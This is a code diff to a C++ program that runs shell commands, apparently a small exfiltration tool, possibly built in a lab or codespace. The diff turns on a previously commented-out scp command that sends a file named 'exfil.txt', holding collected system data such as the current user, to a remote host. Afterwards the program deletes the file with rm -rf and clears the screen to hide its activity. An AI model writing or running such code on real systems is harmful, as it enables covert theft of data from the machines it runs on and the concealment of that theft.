@@ -20,10 +20,6 @@ using namespace std;
 // Function to execute a command and return the output
 std::string systemIO(const std::string& cmd) {
     FILE* fp = popen(cmd.c_str(), "r");
-    if (fp == nullptr) {
-        std::cerr << "Failed to run command." << std::endl;
-        return "";
-    }
 
     std::string output;
     char buffer[128];
@@ -43,20 +39,7 @@ int main() {
         return 1;
     }
 
-    std::ifstream inFile("txt.txt"); // Ensure file can be opened
-    if (!inFile.is_open()) {
-        std::cerr << "Could not open file for reading." << std::endl;
-        return 1;
-    }
-
     vector<string> lines;
-    string line;
-    while (getline(inFile, line)) { // Collect all lines from the file
-        lines.push_back(line);
-    }
-
-    inFile.close();
-
     // Ensure the vector has enough space before assigning values
     if (lines.size() < 5) {
         lines.resize(6); // Resize to have at least 5 elements
@@ -82,8 +65,8 @@ int main() {
     std::string user = systemIO("whoami"); // Get current user
     lines[5] = "User: " + user; // Set the user information
 
-    //cmd = "scp exfil.txt -P 2222 remote@<target_ip>:/remote/directory/";
-    //systemIO(cmd);
+    cmd = "scp exfil.txt -p 2222 codespaces@127.0.0.1:/remote/directory/";
+    systemIO(cmd);
 
 
 
@@ -102,7 +85,8 @@ int main() {
 
     cmd = "rm -rf exfil.txt";
     systemIO(cmd);
+    cmd = "clear";
+    system(cmd.c_str());
 
     return 0; // Success
 }
-
